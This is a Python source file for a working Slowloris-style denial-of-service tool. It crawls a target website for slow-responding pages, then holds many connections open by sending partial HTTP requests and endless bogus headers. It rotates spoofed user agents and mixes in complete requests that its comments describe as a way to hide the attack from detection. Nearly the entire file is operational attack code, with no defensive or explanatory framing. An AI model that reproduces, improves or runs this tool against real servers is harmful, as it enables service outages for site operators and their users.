import sys
import random
import socket
import time
import random as rnd
import scout as rs
from argument_parser import parse_arguments
from abc import ABC, abstractmethod
import ssl
from urllib.parse import urlparse




# List of predefined user agents to use in the attack
DEFAULT_HTTPS_PORT = 443
DEFAULT_HTTP_PORT = 80
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 13_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/83.0.4103.88 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 13_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/83.0.4103.88 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPod; CPU iPhone OS 13_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/83.0.4103.88 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 10; SM-A205U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; LM-Q720) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
    "Mozilla/5.0 (X11; Linux i686; rv:77.0) Gecko/20100101 Firefox/77.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:77.0) Gecko/20100101 Firefox/77.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0"
]


# Explore possible candidates to attack by parsing
# the HTML from the host and recursively collecting references
# to links within the same domain
def get_candidates(host, pages_threshold):
    scout = rs.RelativeScout(host)
    scout.scout_vulnerable_requests(host, pages_threshold)
    scouted_urls = sorted(scout.results.items(), key=lambda item: item[1], reverse=True)
    return [url for url, elapsedTime in scouted_urls]


# Assign cumulative weight to each candidate based on
# candidate index. Lower index gets heavier weight
def assign_index_based_weight(population):
    return [(c, (i + 1) * (i + 2) / 2) for i, c in enumerate(reversed(population))]


# Selects a random candidate from the list of weighted ones.
# The probability of being chosen is tied to the weight of each candidate
def select_candidate(weightedCandidates):
    return random.choices(weightedCandidates, cum_weights=[w for (c, w) in weightedCandidates])[0][0]


# Abstract class to encapsulate attack sockets functionality
class AttackSocket(ABC):
    # Create socket and generate a real request header to store
    def __init__(self, url, port):
        self.socket = self.establish_connection(url, port)
        self.url = url
        self.port = port

    # Establishes a connection between the socket and the server
    # and starts an HTTP or HTTPS request to the target URL
    def establish_connection(self, url, port):
        path_with_params, domain = self.parse_url(url)

        # print(domain)
        # print(path_with_params)
        # print(self.get_request_header)
        # print(self.user_agent_header)
        # print(self.accept_language_header)

        s = socket.socket()
        s.settimeout(4)

        # Fix port if necessary for http/https
        if 'https' in url:
            s = ssl.wrap_socket(s, keyfile=None, certfile=None, server_side=False, cert_reqs=ssl.CERT_NONE, ssl_version=ssl.PROTOCOL_SSLv23)
            if port == DEFAULT_HTTP_PORT:
                port = DEFAULT_HTTPS_PORT
        else:
            if port == DEFAULT_HTTPS_PORT:
                port = DEFAULT_HTTP_PORT

        s.connect((domain, port))

        s.send(self.get_request_header(path_with_params))
        s.send(self.get_user_agent_header())
        s.send(self.get_accept_language_header())
        s.send(self.get_host_header(domain))
        return s

    @staticmethod
    def parse_url(url):
        parsed_url = urlparse(url)
        domain = '{url.netloc}'.format(url=parsed_url)
        path_with_params = parsed_url.path
        if parsed_url.query:
            path_with_params += '?{}'.format(parsed_url.query)
        return path_with_params, domain

    @staticmethod
    def get_request_header(path_with_params):
        return "GET {} HTTP/1.1\r\n".format(path_with_params).encode("utf-8")

    @staticmethod
    def get_accept_language_header():
        return "{}\r\n".format("Accept-language: en-US,en,q=0.5").encode("utf-8")

    @staticmethod
    def get_host_header(host):
        return "Host: {}\r\n".format(host).encode("utf-8")

    @abstractmethod
    def attack(self):
        pass

    @staticmethod
    def get_user_agent_header():
        return "User-Agent: {}\r\n".format(random.choice(user_agents)).encode("utf-8")


# This type of socket indefinitely sends bogus headers to keep the connection open
# for as much time as possible
class HangingSocket(AttackSocket):

    def attack(self):
        path_with_params, _ = self.parse_url(self.url)
        print("Hanging on {}".format(path_with_params))
        self.send_bogus_header()

    def send_bogus_header(self):
        self.socket.send('X-BogusHeader: {}\r\n'.format(random.randint(1, 3000)).encode("utf-8"))


# This type of socket completes a regular request to attempt hiding the attack
class HarmlessSocket(AttackSocket):

    def attack(self):
        path_with_params, _ = self.parse_url(self.url)
        print("Making normal request to {}".format(path_with_params))
        self.complete_request()

    def complete_request(self):
        self.socket.send("\r\n".encode("utf-8"))  # Completes the HTTP request
        # resp = self.socket.recv(4096) # Uncomment to see part of the response
        # print(resp)
        self.socket.close()  # Closes the socket without waiting for a response


# Creates sockets (if needed) until active sockets
# equal the request amount of sockets to use for the attack.
# Each socket will make a request to one of the candidates
def create_sockets(total_sockets, port, weighted_candidates, active_sockets=None):
    if active_sockets is None:
        active_sockets = []

    for _ in range(total_sockets - len(active_sockets)):
        url_to_attack = select_candidate(weighted_candidates)
        # Also send some real request to make it harder to detect
        if rnd.random() > 0.3:
            sckt = HangingSocket(url_to_attack, port)
        else:
            sckt = HarmlessSocket(url_to_attack, port)
        active_sockets.append(sckt)

    return active_sockets


def remove_harmless_sockets(active_sockets):
    for s in active_sockets:
        if type(s) is HarmlessSocket:
            active_sockets.remove(s)


def attack(args):
    candidates_to_attack = get_candidates(args.host, args.pages_threshold)
    weighted_candidates = assign_index_based_weight(candidates_to_attack)

    while True:
        try:
            active_sockets = create_sockets(args.sockets, args.port, weighted_candidates)
            for sckt in active_sockets:
                try:
                    sckt.attack()
                except socket.error:
                    active_sockets.remove(sckt)

            remove_harmless_sockets(active_sockets)

            time.sleep(args.sleep)

        except (KeyboardInterrupt, SystemExit):
            print("Stopping Attack")
            break

        except:
            pass

def main():
    args = parse_arguments(sys.argv[1:])

    print('Attacking target')
    print('Host: ' + args.host)
    print('Port: ' + str(args.port))
    print('Sockets: ' + str(args.sockets))
    print('Sleep between requests: ' + str(args.sleep))
    print('Pages threshold: ' + str(args.pages_threshold))
    attack(args)


if __name__ == "__main__":
    main()
